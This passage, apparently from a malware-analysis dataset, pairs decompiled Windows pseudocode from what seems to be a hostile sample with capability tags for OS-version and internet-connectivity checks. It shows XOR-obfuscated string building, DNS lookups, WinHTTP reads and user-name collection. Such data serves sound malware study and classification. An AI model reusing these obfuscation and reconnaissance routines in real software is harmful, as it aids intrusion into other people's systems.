var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    uint var_28h;\n    int32_t lpString;\n    char *var_20h;\n    int16_t *var_1ch;\n    int16_t *var_18h;\n    int16_t *var_14h;\n    int16_t *var_10h;\n    int16_t *var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    lpString = 0;\n    var_188h = 0;\n    var_ch = fcn.0041ee90(8, 0x40);\n    if (var_ch != NULL) {\n        var_16ch._0_1_ = 0x3e;\n        var_16ch._1_1_ = 0x6a;\n        var_16ch._2_1_ = 0x24;\n        var_16ch._3_1_ = 0x52;\n        var_168h = 0x3c;\n        var_167h = 0x65;\n        var_166h = 0x18;\n        var_165h = 0x72;\n        var_164h = 0x21;\n        var_163h = 0x59;\n        var_162h = 0xc;\n        var_161h = 0x6a;\n        var_160h = 0x1d;\n        var_15fh = 0x52;\n        var_15eh = 0x37;\n        var_15dh = 0x65;\n        var_15ch = 0x37;\n        var_15bh = 0x72;\n        var_15ah = 0x5f;\n        var_159h = 0x59;\n        var_158h = 0x6f;\n        var_157h = 0x6a;\n        var_156h = 1;\n        var_155h = 0x52;\n        var_154h = 0x30;\n        var_153h = 0x65;\n        var_152h = 0xd;\n        var_151h = 0x72;\n        var_150h = 0x3c;\n        var_14fh = 0x59;\n        var_14eh = 4;\n        var_14dh = 0x6a;\n        var_14ch = 6;\n        var_14bh = 0x52;\n        var_14ah = 0x2c;\n        var_149h = 0x65;\n        var_148h = 0x18;\n        var_147h = 0x72;\n        var_146h = 0x37;\n        var_145h = 0x59;\n        var_144h = 0x45;\n        var_143h = 0x6a;\n        var_142h = 0x4f;\n        var_141h = 0x52;\n        var_140h = 0x79;\n        var_13fh = 0x65;\n        var_13eh = 0x48;\n        var_13dh = 0x72;\n        var_13ch = 0x76;\n        var_13bh = 0x59;\n        var_13ah = 0x26;\n        var_139h = 0x6a;\n        var_138h = 0x3a;\n        var_137h = 0x52;\n        var_136h = 0x10;\n        var_135h = 0x65;\n        var_134h = 0x29;\n        var_133h = 0x72;\n        var_132h = 0x13;\n        var_131h = 0x59;\n        var_130h = 0x22;\n        var_12fh = 0x6a;\n        var_12eh = 0x3d;\n        var_12dh = 0x52;\n        var_12ch = 0x7d;\n        var_12bh = 0x65;\n        var_12ah = 0x48;\n        var_129h = 0x72;\n        var_128h = 0x5f;\n        var_127h = 0x59;\n        var_126h = 0x6f;\n        var_125h = 0x6a;\n        var_124h = 0x33;\n        var_123h = 0x52;\n        var_122h = 0x3d;\n        var_121h = 0x65;\n        var_120h = 0x1c;\n        var_11fh = 0x72;\n        var_11eh = 0x33;\n        var_11dh = 0x59;\n        var_11ch = 0xb;\n        var_11bh = 0x6a;\n        var_11ah = 0x11;\n        var_119h = 0x52;\n        var_118h = 0x3c;\n        var_117h = 0x65;\n        var_116h = 0xe;\n        var_115h = 0x72;\n        var_114h = 0x1b;\n        var_113h = 0x59;\n        var_112h = 0x2b;\n        var_111h = 0x6a;\n        var_110h = 0x34;\n        var_10fh = 0x52;\n        var_10eh = 0x79;\n        var_10dh = 0x65;\n        var_10ch = 0x57;\n        var_10bh = 0x72;\n        var_10ah = 0x72;\n        var_109h = 0x59;\n        var_108h = 0x57;\n        var_107h = 0x6a;\n        var_106h = 0x5c;\n        var_105h = 0x52;\n        var_104h = 0x6c;\n        var_103h = 0x65;\n        var_102h = 0x46;\n        var_101h = 0x72;\n        var_100h = 0x72;\n        var_ffh = 0x59;\n        var_feh = 0x47;\n        var_fdh = 0x6a;\n        var_fch = 0x2b;\n        var_fbh = 0x52;\n        var_fah = 0x36;\n        var_f9h = 0x65;\n        var_f8h = 0x1f;\n        var_f7h = 0x72;\n        var_f6h = 0x72;\n        var_f5h = 0x59;\n        var_f4h = 0xb;\n        var_f3h = 0x6a;\n        var_f2h = 0x17;\n        var_f1h = 0x52;\n        var_f0h = 0x3c;\n        var_efh = 0x65;\n        var_eeh = 0xe;\n        var_edh = 0x72;\n        var_ech = 0x72;\n        var_ebh = 0x59;\n        var_eah = 4;\n        var_e9h = 0x6a;\n        var_e8h = 0x52;\n        var_e7h = 0x52;\n        var_e6h = 0x37;\n        var_e5h = 0x65;\n        var_e4h = 0xf;\n        var_e3h = 0x72;\n        var_e2h = 0x25;\n        var_e1h = 0x59;\n        var_e0h = 0x45;\n        var_dfh = 0x6a;\n        var_deh = 4;\n        var_ddh = 0x52;\n        var_dch = 0x3c;\n        var_dbh = 0x65;\n        var_dah = 0x18;\n        var_d9h = 0x72;\n        var_d8h = 0x21;\n        var_d7h = 0x59;\n        var_d6h = 0xc;\n        var_d5h = 0x6a;\n        var_d4h = 0x1d;\n        var_d3h = 0x52;\n        var_d2h = 0x37;\n        var_d1h = 0x65;\n        var_d0h = 0x4a;\n        var_cfh = 0x72;\n        var_ceh = 0x3d;\n        var_cdh = 0x59;\n        var_cch = 3;\n        var_cbh = 0x6a;\n        var_cah = 0x52;\n        var_c9h = 0x52;\n        var_c8h = 0x38;\n        var_c7h = 0x65;\n        var_c6h = 0xe;\n        var_c5h = 0x72;\n        var_c4h = 0x24;\n        var_c3h = 0x59;\n        var_c2h = 0x15;\n        var_c1h = 0x6a;\n        var_c0h = 0x13;\n        var_bfh = 0x52;\n        var_beh = 0x3a;\n        var_bdh = 0x65;\n        var_bch = 1;\n        var_bbh = 0x72;\n        var_bah = 0x7c;\n        var_b9h = 0x59;\n        var_b8h = 1;\n        var_b7h = 0x6a;\n        var_b6h = 0x1e;\n        var_b5h = 0x52;\n        var_b4h = 0x35;\n        var_b3h = 0x65;\n        var_b2h = 0x48;\n        var_b1h = 0x72;\n        var_b0h = 0x5f;\n        var_afh = 0x59;\n        var_aeh = 0x6f;\n        var_adh = 0x6a;\n        var_ach = 0x7f;\n        var_abh = 0x52;\n        var_aah = 0x53;\n        var_a9h = 0x65;\n        var_a8h = 0x31;\n        var_a7h = 0x72;\n        var_a6h = 0x16;\n        var_a5h = 0x59;\n        var_a4h = 0;\n        var_a3h = 0x6a;\n        var_a2h = 0x14;\n        var_a1h = 0x52;\n        var_a0h = 0x38;\n        var_9fh = 0x65;\n        var_9eh = 0x1f;\n        var_9dh = 0x72;\n        var_9ch = 0x3e;\n        var_9bh = 0x59;\n        var_9ah = 0x11;\n        var_99h = 0x6a;\n        var_98h = 0x3b;\n        var_97h = 0x52;\n        var_96h = 0x37;\n        var_95h = 0x65;\n        var_94h = 0x19;\n        var_93h = 0x72;\n        var_92h = 0x26;\n        var_91h = 0x59;\n        var_90h = 4;\n        var_8fh = 0x6a;\n        var_8eh = 0x1e;\n        var_8dh = 0x52;\n        var_8ch = 0x35;\n        var_8bh = 0x65;\n        var_8ah = 0x37;\n        var_89h = 0x72;\n        var_88h = 0x5f;\n        var_87h = 0x59;\n        var_86h = 0x6f;\n        var_85h = 0x6a;\n        var_84h = 0x20;\n        var_83h = 0x52;\n        var_82h = 0x2c;\n        var_81h = 0x65;\n        var_80h = 4;\n        var_7fh = 0x72;\n        var_7eh = 2;\n        var_7dh = 0x59;\n        var_7ch = 0x17;\n        var_7bh = 0x6a;\n        var_7ah = 0x17;\n        var_79h = 0x52;\n        var_78h = 10;\n        var_77h = 0x65;\n        var_76h = 0xf;\n        var_75h = 0x72;\n        var_74h = 0x26;\n        var_73h = 0x59;\n        var_72h = 0x10;\n        var_71h = 0x6a;\n        var_70h = 2;\n        var_6fh = 0x52;\n        var_6eh = 0x1a;\n        var_6dh = 0x65;\n        var_6ch = 5;\n        var_6bh = 0x72;\n        var_6ah = 0x3f;\n        var_69h = 0x59;\n        var_68h = 8;\n        var_67h = 0x6a;\n        var_66h = 0x13;\n        var_65h = 0x52;\n        var_64h = 0x37;\n        var_63h = 0x65;\n        var_62h = 0xe;\n        var_61h = 0x72;\n        var_60h = 0x21;\n        var_5fh = 0x59;\n        var_5eh = 0x45;\n        var_5dh = 0x6a;\n        var_5ch = 0x4f;\n        var_5bh = 0x52;\n        var_5ah = 0x79;\n        var_59h = 0x65;\n        var_58h = 0x4f;\n        var_57h = 0x72;\n        var_56h = 0x21;\n        var_55h = 0x59;\n        var_54h = 0x5f;\n        var_53h = 0x6a;\n        var_52h = 0x40;\n        var_51h = 0x52;\n        var_50h = 0x54;\n        var_4fh = 0x65;\n        var_4eh = 0x60;\n        var_4dh = 0x72;\n        var_4ch = 0x5f;\n        var_4bh = 0x59;\n        var_4ah = 0x6f;\n        var_49h = 0x6a;\n        var_48h = 0x29;\n        var_47h = 0x52;\n        var_46h = 0x7c;\n        var_45h = 0x65;\n        var_44h = 0x19;\n        var_43h = 0x72;\n        var_42h = 0xf;\n        var_41h = 0x59;\n        var_40h = 0x68;\n        var_3fh = 0x6a;\n        var_3eh = 0x78;\n        var_3dh = 0x52;\n        var_3ch = 0x7c;\n        var_3bh = 0x65;\n        var_3ah = 0x19;\n        var_39h = 0x72;\n        var_38h = 0x5f;\n        var_37h = 0x59;\n        var_36h = 0x6f;\n        var_35h = 0x6a;\n        var_34h = 0x72;\n        var_33h = 0x52;\n        var_30h[0] = 0x65;\n        var_30h[1] = 0x6a;\n        var_30h[2] = 0x72;\n        var_30h[3] = 0x52;\n        var_2ch = 0x59;\n        fcn.004012a0(0x274);\n        for (var_8h = 0; var_8h < 0x13a; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_16ch + var_8h) ^ var_30h[var_8h % 5]);\n        }\n        var_10h = fcn.00401270();\n        piVar4 = var_10h + 1;\n        do {\n            iVar1 = *var_10h;\n            var_10h = var_10h + 1;\n        } while (iVar1 != 0);\n        var_14h = var_ch;\n        do {\n            iVar1 = *var_14h;\n            var_14h = var_14h + 1;\n        } while (iVar1 != 0);\n        var_18h = var_ch;\n        do {\n            iVar1 = *var_18h;\n            var_18h = var_18h + 1;\n        } while (iVar1 != 0);\n        var_1ch = arg_8h;\n        do {\n            iVar1 = *var_1ch;\n            var_1ch = var_1ch + 1;\n        } while (iVar1 != 0);\n        arg_10h_00 = ((var_10h - piVar4 >> 1) + (var_14h - (var_ch + 1) >> 1) + (var_18h - (var_ch + 1) >> 1) +\n                     (var_1ch - (arg_8h + 1) >> 1)) * 2 + 8;\n        arg_ch_00 = 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        uVar2 = fcn.00401270(var_ch, var_ch, arg_8h);\n        (*_sym.imp.USER32.dll_wsprintfW)(iVar3, uVar2);\n        lpString = iVar3;\n        if (iVar3 == 0) {\n            var_180h = NULL;\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar3);\n            iVar3 = iVar3 * 2 + 2;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3, lpString, iVar3);\n            uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            var_180h = fcn.0040a130(uVar2, arg_ch_00, arg_10h_00);\n        }\n        *arg_ch = var_180h;\n        var_20h = var_180h;\n        do {\n            var_1h._0_1_ = *var_20h;\n            var_20h = var_20h + 1;\n        } while (var_1h != '\\0');\n        *arg_10h = var_20h - (var_180h + 1);\n        var_188h = 1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        fcn.004012d0();\n    }\n    return var_188h;\n}\n",
        "token_count": 6825
    },
    "0040b910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nbool __cdecl fcn.0040b910(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    do {\n        while( true ) {\n            arg_10h[1] = 0;\n            *arg_10h = 0;\n            var_ch = 0;\n            var_4h = 0;\n            iVar1 = fcn.00410bc0(arg_8h, arg_10h, arg_ch, 0, &var_4h, &var_ch, arg_14h);\n            if (iVar1 != 0) {\n                fcn.004245f0(arg_10h);\n                goto code_r0x0040b9d9;\n            }\n            if (var_4h == 0) {\n                fcn.004245f0(arg_10h);\n                goto code_r0x0040b9d9;\n            }\n            if (var_4h < *arg_10h || var_4h == *arg_10h) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.004245f0(arg_10h);\n        }\n        if (*arg_10h < 5) {\n            fcn.004245f0(arg_10h);\n            break;\n        }\n    } while (*arg_10h[1] != *arg_10h);\ncode_r0x0040b9d9:\n    return *arg_10h != 0;\n}\n",
        "token_count": 398
    },
    "0040ba00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040ba00(uint name, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.WS2_32.dll_gethostbyname)(name);\n    if (iVar1 != 0) {\n        *arg_ch = ***(iVar1 + 0xc);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 97
    },
    "0040ba40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ba40(uint hRequest, int32_t lpBuffer, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t lpdwNumberOfBytesRead;\n    int32_t lpdwNumberOfBytesAvailable;\n    \n    lpdwNumberOfBytesRead = 0;\n    while( true ) {\n        lpdwNumberOfBytesAvailable = 0;\n        iVar1 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(hRequest, &lpdwNumberOfBytesAvailable);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                          (hRequest, lpBuffer + *arg_10h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead);\n        if (iVar1 == 0) break;\n        *arg_10h = *arg_10h + lpdwNumberOfBytesRead;\n        if (lpdwNumberOfBytesAvailable == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "0040baf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040baf0(uint ARG_0)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_44h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint8_t var_24h [4];\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uint var_18h;\n    uint nSize;\n    uint var_10h;\n    uint var_ch;\n    int32_t lpNameBuffer;\n    int32_t var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpNameBuffer = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    nSize = 0x104;\n    var_10h = 0;\n    var_1ch = 1;\n    if (lpNameBuffer != 0) {\n        var_44h._0_1_ = 0x3c;\n        var_44h._1_1_ = 0x43;\n        var_44h._2_1_ = 0x68;\n        var_44h._3_1_ = 0x48;\n        var_40h = 0x2c;\n        var_3fh = 0x62;\n        var_3eh = 0x17;\n        var_3dh = 0x43;\n        var_3ch = 0x20;\n        var_3bh = 0x48;\n        var_3ah = 0xb;\n        var_39h = 0x62;\n        var_38h = 0x49;\n        var_37h = 0x43;\n        var_36h = 0xb;\n        var_35h = 0x48;\n        var_34h = 0x18;\n        var_33h = 0x62;\n        var_32h = 9;\n        var_31h = 0x43;\n        var_30h = 0x20;\n        var_2fh = 0x48;\n        var_2eh = 0x43;\n        var_2dh = 0x62;\n        var_2ch = 0x44;\n        var_2bh = 0x43;\n        var_2ah = 0x60;\n        var_29h = 0x48;\n        var_28h = 10;\n        var_27h = 0x62;\n        var_26h = 100;\n        var_25h = 0x43;\n        var_24h[0] = 100;\n        var_24h[1] = 0x43;\n        var_24h[2] = 0x45;\n        var_24h[3] = 0x48;\n        var_20h = 0x79;\n        var_1fh = 0x62;\n        fcn.004012a0(0x40);\n        for (var_4h = 0; var_4h < 0x20; var_4h = var_4h + 1) {\n            fcn.00401280(var_4h, *(&var_44h + var_4h) ^ var_24h[var_4h % 6]);\n        }\n        cVar1 = (*_sym.imp.Secur32.dll_GetUserNameExW)(2, lpNameBuffer, &nSize);\n        if (cVar1 == '\\0') {\n            var_18h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.0040bab0(var_18h);\n        }\n        else {\n            uVar2 = fcn.00401270(lpNameBuffer);\n            (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, uVar2);\n            var_10h = 1;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpNameBuffer);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        fcn.004012d0();\n    }\n    return var_10h;\n}\n",
        "token_count": 1109
    },
    "0040bc90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bc90(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpVersionInformation;\n    uint var_5ech;\n    uint var_5e8h;\n    uint var_5e4h;\n    uint var_5dch;\n    ushort var_4dch;\n    ushort var_4dah;\n    uint var_4d8h;\n    uint nSize;\n    uint var_4d0h;\n    int32_t var_4cch;\n    uint var_4c8h;\n    int32_t var_4c4h;\n    int32_t var_4c0h;\n    uint var_4bch;\n    uint var_4b8h;\n    uint var_4b4h;\n    uint var_4b0h;\n    uint var_4ach;\n    uint var_4a8h;\n    uint var_4a4h;\n    int32_t var_4a0h;\n    uint var_49ch;\n    uint var_498h;\n    uint var_494h;\n    uint var_490h;\n    uint var_48ch;\n    uchar var_488h;\n    uchar var_487h;\n    uchar var_486h;\n    uchar var_485h;\n    uchar var_484h;\n    uchar var_483h;\n    uchar var_482h;\n    uchar var_481h;\n    uchar var_480h;\n    uchar var_47fh;\n    uchar var_47eh;\n    uchar var_47dh;\n    uchar var_47ch;\n    uchar var_47bh;\n    uchar var_47ah;\n    uchar var_479h;\n    uchar var_478h;\n    uchar var_477h;\n    uchar var_476h;\n    uchar var_475h;\n    uchar var_474h;\n    uchar var_473h;\n    uchar var_472h;\n    uchar var_471h;\n    uchar var_470h;\n    uchar var_46fh;\n    uchar var_46eh;\n    uchar var_46dh;\n    uchar var_46ch;\n    uchar var_46bh;\n    uchar var_46ah;\n    uchar var_469h;\n    uchar var_468h;\n    uchar var_467h;\n    uchar var_466h;\n    uchar var_465h;\n    uchar var_464h;\n    uchar var_463h;\n    uchar var_462h;\n    uchar var_461h;\n    uchar var_460h;\n    uchar var_45fh;\n    uchar var_45eh;\n    uchar var_45dh;\n    uchar var_45ch;\n    uchar var_45bh;\n    uchar var_45ah;\n    uchar var_459h;\n    uchar var_458h;\n    uchar var_457h;\n    uchar var_456h;\n    uchar var_455h;\n    uchar var_454h;\n    uchar var_453h;\n    uchar var_452h;\n    uchar var_451h;\n    uchar var_450h;\n    uchar var_44fh;\n    uchar var_44eh;\n    uchar var_44dh;\n    uchar var_44ch;\n    uchar var_44bh;\n    uchar var_44ah;\n    uchar var_449h;\n    uchar var_448h;\n    uchar var_447h;\n    uchar var_446h;\n    uchar var_445h;\n    uchar var_444h;\n    uchar var_443h;\n    uchar var_442h;\n    uchar var_441h;\n    uchar var_440h;\n    uchar var_43fh;\n    uint8_t var_43ch [4];\n    uchar var_438h;\n    uchar var_437h;\n    uchar var_436h;\n    uchar var_435h;\n    uchar var_434h;\n    uchar var_433h;\n    uchar var_432h;\n    uchar var_431h;\n    uchar var_430h;\n    uchar var_42fh;\n    uchar var_42eh;\n    uchar var_42dh;\n    uchar var_42ch;\n    uchar var_42bh;\n    uchar var_42ah;\n    uchar var_429h;\n    uchar var_428h;\n    uchar var_427h;\n    uchar var_426h;\n    uchar var_425h;\n    uchar var_424h;\n    uchar var_423h;\n    uchar var_422h;\n    uchar var_421h;\n    uchar var_420h;\n    uchar var_41fh;\n    uchar var_41eh;\n    uchar var_41dh;\n    uchar var_41ch;\n    uchar var_41bh;\n    uchar var_41ah;\n    uchar var_419h;\n    uchar var_418h;\n    uchar var_417h;\n    uchar var_416h;\n    uchar var_415h;\n    uchar var_414h;\n    uchar var_413h;\n    uchar var_412h;\n    uchar var_411h;\n    uchar var_410h;\n    uchar var_40fh;\n    uchar var_40eh;\n    uchar var_40dh;\n    uchar var_40ch;\n    uchar var_40bh;\n    uchar var_40ah;\n    uchar var_409h;\n    uchar var_408h;\n    uchar var_407h;\n    uchar var_406h;\n    uchar var_405h;\n    uchar var_404h;\n    uchar var_403h;\n    uchar var_402h;\n    uchar var_401h;\n    uchar var_400h;\n    uchar var_3ffh;\n    uchar var_3feh;\n    uchar var_3fdh;\n    uchar var_3fch;\n    uchar var_3fbh;\n    uchar var_3fah;\n    uchar var_3f9h;\n    uchar var_3f8h;\n    uchar var_3f7h;\n    uchar var_3f6h;\n    uchar var_3f5h;\n    uchar var_3f4h;\n    uchar var_3f3h;\n    uchar var_3f2h;\n    uchar var_3f1h;\n    uchar var_3f0h;\n    uchar var_3efh;\n    uint var_3ech;\n    uchar var_3e8h;\n    uchar var_3e7h;\n    uchar var_3e6h;\n    uchar var_3e5h;\n    uchar var_3e4h;\n    uchar var_3e3h;\n    uchar var_3e2h;\n    uchar var_3e1h;\n    uchar var_3e0h;\n    uchar var_3dfh;\n    uchar var_3deh;\n    uchar var_3ddh;\n    uchar var_3dch;\n    uchar var_3dbh;\n    uchar var_3dah;\n    uchar var_3d9h;\n    uchar var_3d8h;\n    uchar var_3d7h;\n    uchar var_3d6h;\n    uchar var_3d5h;\n    uchar var_3d4h;\n    uchar var_3d3h;\n    uchar var_3d2h;\n    uchar var_3d1h;\n    uchar var_3d0h;\n    uchar var_3cfh;\n    uchar var_3ceh;\n    uchar var_3cdh;\n    uchar var_3cch;\n    uchar var_3cbh;\n    uchar var_3cah;\n    uchar var_3c9h;\n    uchar var_3c8h;\n    uchar var_3c7h;\n    uchar var_3c6h;\n    uchar var_3c5h;\n    uchar var_3c4h;\n    uchar var_3c3h;\n    uchar var_3c2h;\n    uchar var_3c1h;\n    uchar var_3c0h;\n    uchar var_3bfh;\n    uchar var_3beh;\n    uchar var_3bdh;\n    uchar var_3bch;\n    uchar var_3bbh;\n    uchar var_3bah;\n    uchar var_3b9h;\n    uint8_t var_3b8h [4];\n    uchar var_3b4h;\n    uchar var_3b3h;\n    uchar var_3b2h;\n    uchar var_3b1h;\n    uchar var_3b0h;\n    uchar var_3afh;\n    uchar var_3aeh;\n    uchar var_3adh;\n    uchar var_3ach;\n    uchar var_3abh;\n    uchar var_3aah;\n    uchar var_3a9h;\n    uchar var_3a8h;\n    uchar var_3a7h;\n    uchar var_3a6h;\n    uchar var_3a5h;\n    uchar var_3a4h;\n    uchar var_3a3h;\n    uchar var_3a2h;\n    uchar var_3a1h;\n    uchar var_3a0h;\n    uchar var_39fh;\n    uchar var_39eh;\n    uchar var_39dh;\n    uchar var_39ch;\n    uchar var_39bh;\n    uchar var_39ah;\n    uchar var_399h;\n    uchar var_398h;\n    uchar var_397h;\n    uchar var_396h;\n    uchar var_395h;\n    uchar var_394h;\n    uchar var_393h;\n    uchar var_392h;\n    uchar var_391h;\n    uchar var_390h;\n    uchar var_38fh;\n    uchar var_38eh;\n    uchar var_38dh;\n    uchar var_38ch;\n    uchar var_38bh;\n    uchar var_38ah;\n    uchar var_389h;\n    uchar var_388h;\n    uchar var_387h;\n    uint var_384h;\n    uchar var_380h;\n    uchar var_37fh;\n    uchar var_37eh;\n    uchar var_37dh;\n    uchar var_37ch;\n    uchar var_37bh;\n    uchar var_37ah;\n    uchar var_379h;\n    uchar var_378h;\n    uchar var_377h;\n    uchar var_376h;\n    uchar var_375h;\n    uchar var_374h;\n    uchar var_373h;\n    uchar var_372h;\n    uchar var_371h;\n    uchar var_370h;\n    uchar var_36fh;\n    uchar var_36eh;\n    uchar var_36dh;\n    uchar var_36ch;\n    uchar var_36bh;\n    uchar var_36ah;\n    uchar var_369h;\n    uchar var_368h;\n    uchar var_367h;\n    uchar var_366h;\n    uchar var_365h;\n    uchar var_364h;\n    uchar var_363h;\n    uchar var_362h;\n    uchar var_361h;\n    uchar var_360h;\n    uchar var_35fh;\n    uchar var_35eh;\n    uchar var_35dh;\n    uchar var_35ch;\n    uchar var_35bh;\n    uchar var_35ah;\n    uchar var_359h;\n    uchar var_358h;\n    uchar var_357h;\n    uint var_354h;\n    uchar var_350h;\n    uchar var_34fh;\n    uchar var_34eh;\n    uchar var_34dh;\n    uchar var_34ch;\n    uchar var_34bh;\n    uchar var_34ah;\n    uchar var_349h;\n    uchar var_348h;\n    uchar var_347h;\n    uchar var_346h;\n    uchar var_345h;\n    uchar var_344h;\n    uchar var_343h;\n    uchar var_342h;\n    uchar var_341h;\n    uchar var_340h;\n    uchar var_33fh;\n    uchar var_33eh;\n    uchar var_33dh;\n    uchar var_33ch;\n    uchar var_33bh;\n    uchar var_33ah;\n    uchar var_339h;\n    uchar var_338h;\n    uchar var_337h;\n    uchar var_336h;\n    uchar var_335h;\n    uchar var_334h;\n    uchar var_333h;\n    uchar var_332h;\n    uchar var_331h;\n    uchar var_330h;\n    uchar var_32fh;\n    uchar var_32eh;\n    uchar var_32dh;\n    uchar var_32ch;\n    uchar var_32bh;\n    